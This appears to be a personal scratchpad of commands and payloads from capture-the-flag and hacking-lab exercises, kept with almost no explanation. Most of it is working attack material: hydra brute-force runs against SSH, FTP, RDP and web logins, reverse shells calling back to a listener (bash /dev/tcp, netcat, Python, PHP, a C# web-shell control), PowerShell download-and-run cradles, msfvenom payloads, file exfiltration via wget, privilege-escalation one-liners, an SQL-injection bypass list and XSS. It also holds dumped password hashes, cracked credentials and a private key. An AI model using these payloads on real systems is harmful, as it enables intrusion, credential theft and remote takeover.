# 演草纸

hydra -L  /opt/useful/SecLists/Usernames/Names/names.txt -P  /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 94.237.56.248 -s 43434 http-get /

admin:admin

admin:password1

HTB{bru73_f0rc1n6_15_4_l457_r350r7} 

hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p admin -u -f 94.237.56.248 -s 43434 http-get /

hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.236.115 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

hydra -l molly -P /usr/share/wordlists/rockyou.txt -f 10.10.236.115 -s 80 http-get-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.148.136 http-post-form "/content/as:username=^USER^&password=^PASS^:F=incorrect"

hydra -l molly -P /usr/share/wordlists/rockyou.txt ftp://10.10.236.115

sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.148.136/content/as http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"


hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.23.12 -s 22 ssh

hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.74.222

chris:crystal

hydra -L usrname.txt -P locks.txt ftp://10.10.0.146

hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.182.244 -s 22 ssh

gobuster dir -u http://10.10.23.12/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

LFILE=/root
wget -i $LFILE

#!/bin/sh -p\n/bin/sh -p 1>&0

URL=http://10.11.72.135:9000/
LFILE=re.sh
wget $URL -O $LFILE

sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.11.72.135:4444/


less /etc/shadow

amy:$6$UKs4AX7L$8Q1ET3/4EDtczkEAde4Bkc9g4ao2v3IRbapkqtNnWaKa7a2UHbYGsAEqBPlAwXVq8LK39IRjPwmocYkkkikrR0:18399:0:99999:7:::

holt:$6$arvDAeLb$qQX5UfC/TdI2GELzcrI88B7aD.3NGI9eGyhIQPNdtFIcTfzNdSrxt212lOdNM./UQ0dInL0ej4UliuHKKQcjk0:18399:0:99999:7:::

amy:x:1001:1001:,,,:/home/amy:/bin/bash
holt:x:1002:1002:,,,:/home/holt:/bin/bash

gobuster dir -u http://10.10.121.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

document.cookie =SessionToken 'key=value; expires=Thu, 01 Jan 2025 00:00:00 UTC; path=/';

ffuf -u http://10.10.226.233/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt


ffuf -u http://10.10.226.233/FUZZ -w big.txt

ffuf -u http://10.10.226.233/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt

ffuf -u http://10.10.226.233/indexFUZZ -w web-extensions.txt

ffuf -u http://10.10.226.233/FUZZ -w raft-medium-directories-lowercase.txt

ffuf -u http://10.10.226.233/FUZZ -w raft-medium-files-lowercase.txt

gobuster dir -u http://10.10.133.69/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

hydra -l alfred -P /usr/share/wordlists/rockyou.txt 10.10.158.56 -s 8080 rdp

hydra 10.10.54.181 rdp -l alfred -P /usr/share/wordlists/rockyou.txt -V -F

hydra -l Mitch -P /usr/share/wordlists/rockyou.txt -u -f 10.10.133.69 -s 80 http-get /simple/admin/login.php

hydra -l Mitch -P /usr/share/wordlists/rockyou.txt 10.10.182.244 -s 22 ssh

#!/bin/bash

var="8dm7KsjU28B7v621Jls"
value="ERmFRMVZ0U2paTlJYTkxDZz09Cg"

for i in {1..40}
do
        var=$(echo $var | base64)
		
		#<---- If condition here:
done
 Create an "If-Else" condition in the "For"-Loop that checks if the variable named "var" contains the contents of the variable named "value". Additionally, the variable "var" must contain more than 113,450 characters. If these conditions are met, the script must then print the last 20 characters of the variable "var". Submit these last 20 characters as the answer.


 gobuster dir -u http://10.10.234.67/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


 hydra -l admin -P /usr/share/wordlists/rockyou.txt -u -f 10.10.234.67 -s 80 http-post /admin

 hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.234.67 -s 80 http-get-form "/admin:username=^USER^&password=^PASS^:F=<form name='login'"

 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.234.67 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"

  hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.234.67 http-post-form "/admin:user=^USER^&pass=^PASS^&Login=Login:Login failed"


hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.234.67 -s 80 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"


LFILE=/etc/shadow
cat "$LFILE"

LFILE=/etc/shadow
sudo cat "$LFILE"
 gobuster dir -u http://10.10.170.121/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


 

hydra -l ftpuser -P /passwd.txt ftp://10.10.254.80

sudo /usr/bin/vi -c ':!/bin/sh' /dev/null

vi /etc/shadow

gobuster dir -u http://10.10.78.156/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

hydra -L /home/qii/Desktop/SecLists-master/Usernames/Names/ -P /usr/share/wordlists/rockyou.txt -f 10.10.96.56 -s 8080 http-post-from "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"


powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.72.135:9000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.72.135 -Port 1234


msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.72.135 LPORT=1234 -f exe -o shell-name.exe

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.72.135:9000/shell-name.exe','shell-name.exe')"


use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.11.75.135 set 1234 listening-port run

hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.179.174 -s 80 http-post-form "/Account/login.aspx:__VIEWSTATE=UCgl%2BPyvDcjISKfRwzDhjxPsdaJEEawKZMKB95jlI4pABCQsvzEJe5fB%2FM0zs%2FIclJmIStrt8NEhUWmiLBrns%2BStypx8CS9v8MOtl8onq%2B4VE%2FnSQobMFup%2BXdlo0VDt%2F19HL%2Bz1PED9lbs%2FXZVNwh0zMFBGcO6XRsYt%2BoaBumLuvfwDCT9QJ7PaDQraxn8NK%2F8ImKoVk%2F%2B%2BF4xl6My2Wxndk6WWpjZ6m9f%2FTGvinqNtYk59K2yinezFkDZFoLxetEQlVXUofoJU9BGB69SqJ%2BG%2Fih7W6l%2B2MvlY1jSLnHDcvHmJ%2B0iO3Ri7BnKNtHa%2BFxjwh01nSfJmFTPA8iwQ3TtrtJjxPoIznPXWXGk76G3Beibz&__EVENTVALIDATION=R0stOHszyTAuBNmV3eghFAvqcVYC7ESv69r%2BmSkHqGJKUBP3kYMRJRL9gXCQs13VDvolDbVcCDw2Fpjisu%2FO2BNU0SuBn98YXX9xOgzO3yuHcC%2BN9bK2AgJGwfeAGcteTl9r5AifW67DGg47OaAw7ApFYw9MoneDggg8IGuQsBoS6qHz&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

Hydra -l Pennywise -P /usr/share/wordlists/rockyou.txt 10.10.179.174 http-post-form"

__VIEWSTATE=UCgl%2BPyvDcjISKfRwzDhjxPsdaJEEawKZMKB95jlI4pABCQsvzEJe5fB%2FM0zs%2FIclJmIStrt8NEhUWmiLBrns%2BStypx8CS9v8MOtl8onq%2B4VE%2FnSQobMFup%2BXdlo0VDt%2F19HL%2Bz1PED9lbs%2FXZVNwh0zMFBGcO6XRsYt%2BoaBumLuvfwDCT9QJ7PaDQraxn8NK%2F8ImKoVk%2F%2B%2BF4xl6My2Wxndk6WWpjZ6m9f%2FTGvinqNtYk59K2yinezFkDZFoLxetEQlVXUofoJU9BGB69SqJ%2BG%2Fih7W6l%2B2MvlY1jSLnHDcvHmJ%2B0iO3Ri7BnKNtHa%2BFxjwh01nSfJmFTPA8iwQ3TtrtJjxPoIznPXWXGk76G3Beibz&__EVENTVALIDATION=R0stOHszyTAuBNmV3eghFAvqcVYC7ESv69r%2BmSkHqGJKUBP3kYMRJRL9gXCQs13VDvolDbVcCDw2Fpjisu%2FO2BNU0SuBn98YXX9xOgzO3yuHcC%2BN9bK2AgJGwfeAGcteTl9r5AifW67DGg47OaAw7ApFYw9MoneDggg8IGuQsBoS6qHz&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in

``````
<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>

<script runat="server">
	static System.IO.StreamWriter streamWriter;

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);

	using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.11.72.135", 4445)) {
		using(System.IO.Stream stream = client.GetStream()) {
			using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
				streamWriter = new System.IO.StreamWriter(stream);
						
				StringBuilder strInput = new StringBuilder();

				System.Diagnostics.Process p = new System.Diagnostics.Process();
				p.StartInfo.FileName = "cmd.exe";
				p.StartInfo.CreateNoWindow = true;
				p.StartInfo.UseShellExecute = false;
				p.StartInfo.RedirectStandardOutput = true;
				p.StartInfo.RedirectStandardInput = true;
				p.StartInfo.RedirectStandardError = true;
				p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
				p.Start();
				p.BeginOutputReadLine();

				while(true) {
					strInput.Append(rdr.ReadLine());
					p.StandardInput.WriteLine(strInput);
					strInput.Remove(0, strInput.Length);
				}
			}
		}
    	}
    }

    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
   	StringBuilder strOutput = new StringBuilder();

       	if (!String.IsNullOrEmpty(outLine.Data)) {
       		try {
                	strOutput.Append(outLine.Data);
                    	streamWriter.WriteLine(strOutput);
                    	streamWriter.Flush();
                } catch (Exception err) { }
        }
    }

</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>
``````

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.72.135 LPORT=1234 -f exe -o shell-name.exe

Downloadfile('http://10.11.72.135:8000/shell-name.exe','shell-name.exe')

powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.28.128/imag/evil.txt','evil.exe')

wget -O "shell-name.exe" http://10.11.72.135:8000/shell-name.exe

powershell -c "Invoke-WebRequest -Uri 'http://10.11.72.135:9000/reverse.exe' -OutFile 'C:\PrivEsc'"


hydra -l admin -P /usr/share/wordlists/rockyou.txt -f b6d0a45c-8351-46e8-86fb-a565dcdef055.node.nkctf.yuzhian.com.cn -s 80 http-post-form "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect"


sqlmap -u http://b6d0a45c-8351-46e8-86fb-a565dcdef055.node.nkctf.yuzhian.com.cn/ 

admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
'or'='or'
admin
admin'--
admin' or 4=4--
admin' or '1'='1'--
admin888
"or "a"="a
admin' or 2=2#
a' having 1=1#
a' having 1=1--
admin' or '2'='2
')or('a'='a
or 4=4--
c
a'or' 4=4--
"or 4=4--
'or'a'='a
"or"="a'='a
'or''='
'or'='or'
1 or '1'='1'=1
1 or '1'='1' or 4=4
'OR 4=4%00
"or 4=4%00
'xor
admin' UNION Select 1,1,1 FROM admin Where ''='
1
-1%cf' union select 1,1,1 as password,1,1,1 %23
1
17..admin' or 'a'='a 密码随便
'or'='or'
'or 4=4/*
something
' OR '1'='1
1'or'1'='1
admin' OR 4=4/*
1'or'1'='1

MFLTC53CGNFDASKHJJUGGMSVGJHECMCLIRIXA4DCLBBHMY3OKFTWER3MNFRG4VTUIRIXA3LDNU4XISKFJZ4WKWCCGBRHSNKRMRLUU43BK5HEYWSYNNTWCVZRO4FGEM2KGBEUMSSUKFITAS2EKFYHOZCXJJZFUWDLM5IFGQLJJFUUS5CMKMYHITCVJJDFEMDMJ5EUMQSWKFVXQSSRPFBEYUSWNN2EYUZQORG


HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.8.10
Date: Sun, 28 Jan 2024 11:15:00 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 4496
Connection: close

import base64

import libnum
from Crypto.PublicKey import RSA

pubkey = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB"


prikey ="MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg=="


pubkey = RSA.import_key(pubkey)
prikey = RSA.import_key(prikey)
n = pubkey.n

def enc_replace(base64_str: str):
    base64_str = base64_str.replace("/", "e5Lg^FM5EQYe5!yF&62%V$UG*B*RfQeM")
    base64_str = base64_str.replace("+", "n6&B8G6nE@2tt4UR6h3QBt*5&C&pVu8W")
    return base64_str.replace("=", "JXWUDuLUgwRLKD9fD6&VY2aFeE&r@Ff2")

def encrypt(plain_text):
    # 私钥加密
    cipher_text = b""
    for i in range(0, len(plain_text), 128):
        part = plain_text[i:i+128]
        enc = libnum.n2s(pow(libnum.s2n(part), prikey.d, n))
        cipher_text += enc
    return enc_replace(base64.b64encode(cipher_text).decode())

if __name__ == '__main__':
    m = b"-RSA-" * 30
    print(f"原始数据: {m}")

    c = encrypt(m)
    print(f"加密数据: {c}")


deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse



# 官方源
# deb http://http.kali.org/kali kali-rolling main non-free contrib
# deb-src http://http.kali.org/kali kali-rolling main non-free contrib
#根据需要自己选一个，中科大的还可以
#中科大
deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
#阿里云
#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
#清华大学
#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
#浙大
#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
#东软大学
#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
#重庆大学
#deb http://http.kali.org/kali kali-rolling main non-free contrib


curl -O http://94.237.58.148:34710/download.php

gobuster dir -u http://10.10.13.193/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

mypasswordforthatjob

mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

8a28a94a588a95b80163709ab4313aa4
ae1644dac5b77c0cf51e0d26ad6d7e56
1dc352435fecca338acfd4be10984009
19f5af754c31f1e2651edde9250d69bb
90dc16d47114aa13671c697fd506cf26
a92b8a29ef1183192e3d35187e0cfabd
0e9588cb62f4b6f27e33d449e2ba0b3b
4d6e42f56e127803285a0a7649b5ab11
f7fd98d380735e859f8b2ffbbede5a7e

baksteen
S1ck3nBluff+secureshell

Skyler

scoobydoo2       (seina@fowsniff)     
Proceeding with incremental:ASCII
apples01         (tegel@fowsniff)     
bilbo101         (mustikka@fowsniff)     
skyler22         (baksteen@fowsniff)     
07011972         (sciana@fowsniff)   

xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.140.146 /smart-sizing

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((10.11.72.135,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.72.135 LPORT=1234 -f exe -o reverse.exe


copy \\10.11.72.135\kali\reverse.msi C:\PrivEsc\reverse.exe

\PrivEsc\accesschk.exe /accepteula -uwcqv user unquotedsvc

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.72.135 LPORT=4444 -f msi -o reverse.msi

curl -u admin:admin http://94.237.63.83:49099/search.php?search=flag 

curl -X POST -d {"search":"flag"} -b "PHPSESSID=nbl9cdo1f8nota9c05qv34lokv" -H  'Content-Type:application/json' http://83.136.255.150:43766/search.php[]

PHPSESSID=nbl9cdo1f8nota9c05qv34lokv

Content-Type: application/json

PHPSESSID	"nbl9cdo1f8nota9c05qv34lokv"

Nashville-Davidson (US)"

curl -X POST -d '{search:"flag"}' -b 'PHPSESSID=nbl9cdo1f8nota9c05qv34lokv' -H 'Content-Type: application/json' http://83.136.255.150:43766/search.php[]

ssh -L 10000:localhost:10000 agent47@10.10.67.162

firewall-cmd --zone=public --add-port=22/tcp --permanent

firewall-cmd --zone=public --remove-port=22/tcp --permanent

agent47:videogamer124

python -c 'import pty; pty.spawn("/bin/bash")'

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.199.227

smbclient //10.10.199.227/anonymous


hydra -l miles -P log1.txt 10.10.199.227 -s 22 imap

hydra -l milesdyson -P log1.txt smb://10.10.199.227

nmap -p 22,80,110,142,445,139 --script vuln 10.10.199.227

login_username=admin&secretkey=admin&js_autodetect_results=1&just_logged_in=1

hydra -l Miles -P log1.txt -f 10.10.199.227 -s 80 http-post-from "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."

milesdyson:cyborg007haloterminator

 )s{A&2Z=F^n_E.B`

 serenakogan

smbclient //10.10.176.13/milesdyson -U Milesdyson
smbclient -U Milesdyson% //10.10.199.227/milesdyson

smbget -R smb://10.10.199.227/milesdyson -U Milesdyson

Password: )s{A&amp;2Z=F^n_E.B`

/45kra24zxs28v3yd

http://10.10.176.13/45kra24zxs28v3yd/


gobuster dir -u http://10.10.52.131/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

?urlConfig=http://10.11.72.135:9000/reverse.php


Field configuration:
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false postfix:x:113:121::/var/spool/postfix:/bin/false mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false


<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.11.72.135/1234 0>&1'");
?>

gobuster dir -u http://10.10.238.221/administrator -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

sqlmap -u "http://10.10.238.221/index.php?option=com_fields&view=fields&layout=modal&list[=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)]

sqlmap -u "http://10.10.238.221/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

sqlmap -u "http://10.10.238.221/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
spiderman123

echo #!/bin/bash bash -i >& /dev/tcp/10.10.10.10/4444 0>&1 > index.php

whoami;php exec("/bin/bash -c 'bash -i >& /dev/tcp/<10.11.72.135>/4444 0>&1'");

commix --url "http://10.10.52.131/secret" --data="target=www.nsa.gov&form=submit"  

x=c,y=t,z=a,$x$z$y /etc/shadow


x=b,$xash -i >& /dev/tcp/10.11.72.135/4444 0>&1

whoami;nc 10.11.72.135 4444 -e /bin/bash

whoami;bash -i >& /dev/tcp/10.11.72.135/4444 0>&1

whoami;php -r 'system("bash -i >& /dev/tcp/10.11.72.135/4444 0>&1");'

#!/bin/bash
bash -i >& /dev/tcp/10.11.72.135/4444 0>&1

wget 10.11.72.135:9000/reshell.sh|ba\sh

whoami;php -r '$sock=fsockopen("10.11.72.135",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

echo 'bash -i >& /dev/tcp/10.11.72.135/4444 0>&1' >> .helpline.sh


gobuster dir -u http:/// -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
gobuster dir -u http:/// -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

PUSH 8
POP ECX
MOV ESI, OFFSET _SomeStructure
MOV EDI, OFFSET _SomeStructure2
REP MOVSD

gobuster dir -u http://10.10.126.84/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::


<button onclick="inputFunction()">Click to enter your name</button>

</script><img src=/ onerror=alert(document.cookie)><script>

gobuster dir -u http://10.10.132.234/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

maya

dev team

hydra -l Maya -P /usr/share/wordlists/rockyou.txt ftp://10.10.199.227

lennie:x:1002:1002::/home/lennie:


cp /incidents/suspicious.pcapng /var/www/html/files/ftp


0000   00 00 03 04 00 06 00 00 00 00 00 00 7d df 08 00   ............}...
0010   45 00 00 62 02 68 40 00 40 06 89 c7 c0 a8 16 8b   E..b.h@.@.......
0020   c0 a8 16 8b 11 5c 9f e6 bf 7f c7 84 2f 35 b0 36   .....\....../5.6
